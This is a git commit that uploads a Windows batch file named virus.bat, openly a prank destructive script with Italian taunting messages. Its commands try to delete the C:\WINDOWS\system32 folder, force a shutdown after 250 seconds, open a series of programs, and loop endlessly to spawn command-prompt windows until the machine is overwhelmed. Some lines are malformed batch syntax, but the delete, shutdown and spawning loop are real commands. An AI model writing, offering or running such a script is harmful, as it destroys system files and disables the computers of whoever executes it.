cee1bd122dc4eb2969726269bb0dbd94b6c020e2
okukkiti <135546846+okukkiti@users.noreply.github.com>
2023-06-04 20:56:49 +0200

    Add files via upload

---
+++ virus.bat
@@ -0,0 +1,27 @@
+@echo off
+del C:\WINDOWS\system32 
+
+@echo off
+di addio al tuo computer fra 250 secondi
+
+shutdown -s -t 250
+
+@echo off // 
+:x   //loop variable
+start winword 
+start mspaint  //open paint
+start notepad
+start write
+start cmd //open command prompt
+start explorer
+start control
+start calc // open calculator
+loop
+
+@echo off 
+msg * sei stato nukato da ale lmaooo
+
+:x
+start cmd.exe
+goto x
+loop
